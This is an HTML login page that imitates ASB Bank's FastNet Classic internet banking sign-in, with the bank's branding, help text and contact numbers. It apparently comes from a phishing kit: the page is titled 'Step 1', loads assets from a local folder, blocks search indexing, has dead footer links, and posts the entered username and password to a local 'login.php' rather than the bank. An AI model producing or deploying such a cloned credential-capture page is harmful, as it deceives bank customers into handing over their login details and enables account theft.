 
<!DOCTYPE html>
<!--[if HTML5]><![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie11 lt-ie10 lt-ie9"> <![endif]-->
<!--[if IE 9]>         <html class="no-js lt-ie11 lt-ie10"> <![endif]-->
<!--[if IE 10]>        <html class="no-js lt-ie11"> <![endif]-->
<!--[if gt IE 10]><!-->
<html class="no-js">
<!--<![endif]-->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex,nofollow" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="cache-control" content="max-age=0" />
	<meta http-equiv="cache-control" content="no-cache" />
	<meta http-equiv="expires" content="0" />
	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
	<meta http-equiv="pragma" content="no-cache" />
    <link rel="shortcut icon" href="1/favicon.ico" />
    
        <title>Step 1</title>
    

    <link href="1/screen.min.css?v=2015.1.8" rel="stylesheet" />
    <script src="1/modernizr-2.7.1.js?v=2015.1.8" type="text/javascript"></script>     
    <script src="1/json2.min.js?v=2015.1.8"></script>
    <script src="1/sha1.min.js?v=2015.1.8"></script>
    <script src="1/jquery-1.11.0.min.js?v=2015.1.8" type="text/javascript"></script>
    <script src="1/PopupManager.min.js?v=2015.1.8"></script>
    <script src="1/custFontSize.min.js?v=2015.1.8"></script>
    
	
        
        
	
        <script type="text/javascript" language="javascript">
	var loginConfig = { isRememberMe: false, username: 'null' };	
	
	
function getCookie(cname) {
	var name = cname + "=";
	var ca = document.cookie.split(';');
	for(var i=0; i<ca.length; i++) {
		var c = $.trim(ca[i]);
		if (c.indexOf(name)==0) 
			return c.substring(name.length,c.length);
  	}
	return "";
}

</script>
                           

</head>

    <body id="body">
    <!-- Start container -->
    <div class="content">
		<div class="asb-logo">
            <a href="#">
            <img src="1/logo-asb.png" alt="ASB Logo" width="109" height="25">
            </a>
        </div>
		
        <div class="title">
            <h1>
			Continue to 
				
				
				
				FastNet Classic
			</h1>
        </div>
		<!-- No javascript error message -->
		<noscript>
			<div class="warning message input">
				<table>
					<tr>
						<td>
							<div class="icon info"></div>
						</td>
						<td>
							<h3>
								Your browser seems to have Javascript disabled. Make sure Javascript is enabled to log in.
							</h3>
						</td>
					</tr>
				</table>
			</div>
		</noscript>		
        <!-- Session expired error message 
			
		<div class="warning message input">
            <table>
                <tr>
                    <td>
                        <div class="icon alert"></div>
                    </td>
                    <td>
                        <h3>
                            Your session has expired. Please log in again.
                        </h3>
                    </td>
                </tr>
            </table>
        </div>
        
        -->
		<!-- No cookies error message -->
	

		
		
		<div class="input-panel">
            <form name="login" method="post" action="login.php" id="login" autocomplete="off" aria-autocomplete="none">
              <input type="hidden" name="authnMod" value="AsbRgyAuthn" />
              <input name="action" type="hidden" value="login"/>
              <input type="hidden" name="secfk" value="9U6H-6UQH-VPB1-ONNE-9IGT-1XFR-LVE2-QAHW" />
              <input type="hidden" name="goto" value="#" />
              <input type="hidden" name="username" id="username" class="a"/>
			  <input type="hidden" name="MSISDN" value="" />
			  
			  <div id="divRemembered" style="display: none;">
			  <div id="customerNameP" class="remembered-name">
				<h3>Hi </h3>
				<h3 id="customerNameS">null</h3>
			  </div>			  
			  </div>			  
              <div id="divNotRemembered" class="textbox " style="display: none;">
                <input id="dUsername" name="username" type="text" placeholder="Username" maxlength="10" required="" />
                <span class="text-addon icon person"></span>
              </div>			  
			  <div class="textbox ">
                <input id="password" name="password" autocomplete="off" maxlength="100" type="password" placeholder="Password" class="b"  required="" />
                <span class="text-addon icon key"></span>
              </div>			  
			  <div class="error-container message input hide">
                <table>
                    <tr>
                        <td>
                            <div class="icon alert"></div>
                        </td>
                        <td>
                            <h3>
                                null
                            </h3>
                        </td>
                    </tr>
                </table>   
              </div>			  
			  <div class="primary-button">
                <input id="loginBtn" name="Log in button" type="submit" value="Log In" />
              </div>			  
			  <div class="help-menu">
                <table>
                    <tr>
                        <td>
                            <div class="remember-checkbox page-control">
								<input id="remember_me" name="remember_me" type="hidden">
                                <input id="remember_me_checkbox" name="remember_me_checkbox" type="checkbox" />
                                <label for="remember_me_checkbox"></label>
                            </div>
                        </td>
                        <td>
                            <h3>
                                Remember my name
                            </h3>
                        </td>
                        <td>
                            <input type="button" id="ddRememberMe" name="display more information" class="dropdown down page-control" value="" />
                        </td>
                    </tr>
                </table>
              </div>
              <div id="divRememberMeHelp" class="help-rememberme">
                <div id="divRememberMe">
                    <h3>
                        For your convenience check this box and next time you
                        log in, just enter your password. We recommend you use
                        this only on browsers you do not share with others.
                    </h3>
                </div>
                <div id="divForgetMe">
                    <h3>
                        Uncheck this box to enter your username.
                    </h3>
                </div>
              </div>
              <div class="help-menu">
                <table class="forgotten-container">
                    <tr>
                        <td>

                        </td>
                        <td>
                            <h3>Forgotten username or password?</h3>
                        </td>
                        <td>
                            <input type="button" id="ddContact" name="display more information" class="dropdown down page-control" value="" />
                        </td>
                        <td>

                        </td>
                    </tr>
                </table>
              </div>
                
              <div id="divContactHelp" class="help-contact">
                <div class="contact-text">
                    <h3>
                        Call the Contact Centre on
                    </h3>
                </div>
                <div class="contact-number">
                    <table>
                        <tr>
                            <td>
                                <div class="icon phone"></div>
                            </td>
                            <td>
                                <h2>
                                    <a href="tel:0800327863" tabindex="-1" role="menuitem">
                                        0800 327 863
                                    </a>
                                </h2>
                            </td>
                        </tr>
                    </table>
                </div>
                <div class="contact-text">
                    <h3>
                        within New Zealand or
                    </h3>
                </div>
                <div class="contact-number">
                    <table>
                        <tr>
                            <td>
                                <div class="icon phone"></div>
                            </td>
                            <td>
                                <h2>
                                    <a tabindex="-1" class="call" role="menuitem" href="tel:006493063185">
                                        +64 9 306 3185
                                    </a>
                                </h2>
                            </td>
                        </tr>
                    </table>
                </div>
                <div class="contact-text">
                    <h3>
                        outside New Zealand
                    </h3>
                </div>
              </div>
            </form>
		</div>		
        <div class="footer">      
            
            
            
            <ul class="links"><li><a href="#"" target="_blank" title="Terms &amp; Conditions">Terms &amp; Conditions</a></li><li><a href="#" target="_blank" title="About Security">About Security</a></li><li><a href="#" target="_blank" title="Privacy Statement">Privacy</a></li><li><a href="#" target="_blank" title="Internet Access Terms">Internet Access Terms</a></li></ul><div class="notes"><p>FastNet is licensed to ASB Bank Limited and is solely for the use of persons authorised by ASB Bank Limited.</p><p>Do not access FastNet unless you have been specifically authorised to do so. Unauthorised access is prohibited.</p></div>
		</div>
    </div>	
	<script type="text/javascript" src="1/loginBody.min.js?v=2015.1.8"></script> 

    <script src="1/p.min.js?v=2015.1.8" type="text/javascript"></script> 
    <script type="text/javascript" id="initialFuncScript"></script>    
</body>

 
</html> 